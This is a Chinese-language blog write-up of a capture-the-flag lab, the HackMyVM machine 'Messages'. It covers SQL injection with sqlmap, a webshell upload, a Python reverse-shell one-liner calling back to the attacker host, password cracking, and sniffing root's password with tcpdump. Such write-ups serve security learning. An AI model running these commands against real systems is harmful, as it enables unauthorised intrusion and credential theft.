<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bkCGMH5JSwgHSJJRMzu8Gw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 53篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUuv1EgLJGaeXllB5PE900V7ANXCJOyCSNdlgNLiaic5xDvNJNksSEFXpgjxGtBMaTKRGLIo0EFVxQ2Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
=========================================================================================================================================================================

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Messages  
网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
```

靶场: HackMyVm.eu

靶机名称: Messages

难度: 简单

发布时间: 2022年1月28日

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:VMware kali 10.0.0.3  
  
靶机:Vbox linux IP自动获取
```

  

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
sudo nmap -sP 10.0.0.1/24
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到主机地址为10.0.0.136

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 10.0.0.136 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（因为开放端口太多不好截图，这里重做了一个扫描）

可以看到，靶机上开放了ssh、http、https和email服务，先来访问80端口

Web渗透
-----

```
http://10.0.0.136
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

打开首页跳转到https服务，页面中发现两个功能模块，一个聊天机器人和个邮箱服务，我们一个一个检查，先看聊天机器人

```
https://10.0.0.136/chatbot/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

打开后在右下角发现程序的名称和版本，对chatbot做个目录扫描

```
gobuster dir -u https://10.0.0.136/chatbot/ -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到多个目录，先看看后台

```
https://10.0.0.136/chatbot/admin/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

尝试登录抓个包试下暴破密码和sql注入，先做个sql注入测试

```
sqlmap -u 'https://10.0.0.136:443/chatbot/classes/Login.php?f=login' --data='username=admin&password=123' --cookie='PHPSESSID=0feamafmpd0e4iahfb0v6k7nvj;roundcube_sessid=fajmig9q2rsass1t3n8871f70q' --batch
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

存在sql注入，继续查数据库名

```
sqlmap -u 'https://10.0.0.136:443/chatbot/classes/Login.php?f=login' --data='username=admin&password=123' --cookie='PHPSESSID=0feamafmpd0e4iahfb0v6k7nvj;roundcube_sessid=fajmig9q2rsass1t3n8871f70q' --batch --dbs
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查到多个库名，先看看chatbot的表

```
sqlmap -u 'https://10.0.0.136:443/chatbot/classes/Login.php?f=login' --data='username=admin&password=123' --cookie='PHPSESSID=0feamafmpd0e4iahfb0v6k7nvj;roundcube_sessid=fajmig9q2rsass1t3n8871f70q' --batch -D chatbot --tables
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

表名出来了，查一下users表内容

```
sqlmap -u 'https://10.0.0.136:443/chatbot/classes/Login.php?f=login' --data='username=admin&password=123' --cookie='PHPSESSID=0feamafmpd0e4iahfb0v6k7nvj;roundcube_sessid=fajmig9q2rsass1t3n8871f70q' --batch -D chatbot -T users --dump
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到账号和密码，现在去登录

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，找找可利用的信息

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

设置中找到多个上传点，试试能不能上传个webshell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

上传成功，验证一下

1。攻击机上监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。访问webshell触发反弹shell

```
https://10.0.0.136/chatbot/uploads/1646575560_shell.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

反弹成功，切换到交互式shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
Ctrl+z快捷键  
stty raw -echo;fg  
reset
```

不知是shell脚本的问题还是其他什么原因，反弹回来的shell无法持久，在这里我在靶机上用python3重新反弹shell到攻击机的3333端口

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.3",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

现在来找找敏感信息

```
cd /home/ruby  
ls -al  
cat notes
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在ruby用户下找到notes文件，里面有些提示信息

```
待办事项：  
信任证书  
修改shell密码匹配webmail  
完成事项：  
检查电子邮件ireadadmin工作是否正常  
chatbot正常使用  
仅限ssh密码登录   
创建root用户的邮箱
```

再找找敏感信息

```
cat /var/www/html/chatbot/initialize.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现数据库账号密码，登录mysql查询下是否有可利用的信息

```
mysql -u<username> -p<password>  
show databases;  
use vmail  
show tables;  
select * from mailvbox
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到3组帐号密码，将密码保存好拿来暴破

```
vi pass.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

暴破出runy的密码，切换到ruby账号试试

```
su runy
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

密码错误，可能是邮箱的后台密码，登录试试

```
https://10.0.0.136/mail/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，并且在已发邮件中找到了key内容，把key保存下来登录ssh

```
vi id_rsa  
chmod 600 id_rsa  
ssh ruby@10.0.0.136 -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，收集下敏感信息

```
ls  
cat userflag.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，找找提权信息，上传个pspy64检查下后台有没有程序在运行

1。攻击机开启http服务

```
python3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

2。靶机下载pspy64s并执行

```
cd /tmp  
wget http://10.0.0.3:8000/pspy64s
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现有个python脚本在后台定时运行，但是我们无法访问

上传辅助提权脚本继续找

```
wget http://10.0.0.3:8000/linpeas.sh
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现tcpdump有执行权限，结合自动运行的python脚本，之前登录邮箱时里面有个邮件提示说是有个脚本会检测root帐号的邮箱。这样就可以使用tcpdump抓登录的帐号密码了，在之前的notes文件当中也提示邮箱密码与root帐号密码相同，现在来验证下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
tcpdump -i lo -w - |grep -a 'PASS'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到密码，切换root用户验证下

```
su root
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换成功，找下flag

```
cd /root  
ls  
cat rootflag.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到rootflag.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)